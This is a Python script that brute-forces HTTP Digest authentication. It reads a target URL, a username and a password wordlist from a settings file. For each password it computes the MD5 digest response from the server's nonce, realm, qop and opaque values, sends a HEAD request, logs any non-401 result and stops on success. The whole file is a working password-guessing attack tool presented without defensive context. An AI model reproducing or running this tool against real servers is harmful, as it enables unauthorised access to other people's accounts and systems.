import hashlib
import json
import re
import requests
import secrets
import typing
from requests import Response


def md5(*args: typing.Any) -> str:
    """Takes any number of arguments, joins them with `:` , and returns the hash of that string"""
    string = ":".join(str(x) for x in args)
    return hashlib.md5(string.encode()).hexdigest()


def read_settings() -> dict[str, typing.Any]:
    """reads 'settings.json' and returns a dictionary of each item in it"""
    with open('settings.json', 'r') as file:
        settings = json.load(file)
    return settings


def read_passwords(filename: str, total_tried) -> list[str]:
    """reads a file of name 'filename' and returns a list containing every line, filtered for newlines"""
    with open(filename, 'r', encoding='utf8') as file:
        passwords = file.readlines()
    passwords = [password.rstrip() for password in passwords]
    if total_tried > len(passwords):
        print("Total is larger than number of passwords provided, please change.")
        exit()
    passwords = passwords[total_tried:]
    print(len(passwords), 'passwords loaded')
    return passwords


def get_nonce(string: str) -> typing.Optional[str]:
    """Takes a 'www-authenticate' header and returns the nonce within it"""
    nonce_regex_obj = re.search(r'nonce="([^"]+)"', string)
    if nonce_regex_obj:
        return nonce_regex_obj.group(1)
    else:
        return None


def get_opaque(string: str) -> typing.Optional[str]:
    """checks a 'www-authenticate' header for a opaque and returns it if it is found, otherwise it returns 'None'"""
    opaque_regex_obj = re.search(r'opaque="([^"]+)"', string)
    if opaque_regex_obj:
        return opaque_regex_obj.group(1)
    else:
        return None


def get_init_header(base_url: str, uri: str):
    """makes a request to an auth endpoint and returns the realm, and qop and/or opaque if applicable, and also gets the first nonce
    to start off the chain"""
    request = requests.head(base_url + uri)
    realm_match_object = re.search(r'realm="([^"]+)"', request.headers['www-authenticate'])
    if realm_match_object:
        realm = realm_match_object.group(1)
    else:
        realm = None
    qop_match_object = re.search(r'qop="([^"]+)"', request.headers['www-authenticate'])
    if qop_match_object:
        qop = qop_match_object.group(1)
    else:
        qop = None
    nonce = get_nonce(request.headers['www-authenticate'])
    opaque = get_opaque(request.headers['www-authenticate'])
    return nonce, realm, qop, opaque


def hash_response(username, realm, password, uri, nonce, client_nonce, qop) -> str:
    """Calculates the response hash and takes into account if 'auth' qop is being used"""
    h1 = md5(username, realm, password)
    h2 = md5('HEAD', uri)
    if qop:
        response = md5(h1, nonce, '00000001', client_nonce, qop, h2)
    else:
        response = md5(h1, nonce, h2)
    return response


def make_request(username, realm, password, base_url, uri, nonce, qop, opaque) -> Response:
    """Takes in many parameters and puts together a proper request with all fields calculated, returning a Response
    object """
    client_nonce = secrets.token_hex(4)
    response = hash_response(username, realm, password, uri, nonce, client_nonce, qop)
    header = {'Authorization': f'Digest username="{username}", realm="{realm}", nonce="{nonce}", uri="{uri}", algorithm=MD5, response="{response}"'}
    if qop:
        header['Authorization'] += f', qop={qop}, nc=00000001, cnonce="{client_nonce}"'
    if opaque:
        header['Authorization'] += f', opaque="{opaque}"'
    request = requests.head(base_url+uri, headers=header)
    return request


def log_request(status_code: int, password: str, counter: int) -> None:
    """Logs the status code, password, and password counter in the file 'results.txt' and exits the program if it
    gets a status code in the 200's"""
    print(f'\nStatus {status_code} detected: used "{password}" and counter at {counter}\n')
    with open("results.txt", "a") as results:
        results.write(
            f"Password: {password}\nCounter: {counter}\nStatus: {status_code}\n\n"
        )
    if 200 <= status_code < 300:
        print("Exiting")
        exit()


def refresh_nonce_and_opaque(base_url, uri) -> typing.Tuple[typing.Optional[str], typing. Optional[str]]:
    request = requests.head(base_url+uri)
    return request


def print_progress(counter, password, status_code):
    """editable print function to get an idea on how to program is working"""
    if counter % 100 == 0:
        print(counter, end=', ')
    # print(counter, password, status_code)
    # print(request.request.headers)


def main() -> None:
    """main loop, reads settings, inits values, and runs the loop for all passwords in the password file,
    making a new request for each one and extracting important values from the request response"""
    settings = read_settings()
    counter = -1 + settings['total_tried']
    passwords = read_passwords(settings['password_file'], settings['total_tried'])
    nonce, realm, qop, opaque = get_init_header(settings['base_url'], settings['uri'])
    for password in passwords:
        counter += 1
        request = make_request(settings['username'], realm, password, settings['base_url'], settings['uri'], nonce, qop, opaque)
        if request.status_code != 401:
            log_request(request.status_code, password, counter)
            request = refresh_nonce_and_opaque(settings['base_url'], settings['uri'])
        if opaque:
            opaque = get_opaque(request.headers['www-authenticate'])
        nonce = get_nonce(request.headers['www-authenticate'])
        print_progress(counter, password, request.status_code)
    print("List finished")


if __name__ == '__main__':
    main()
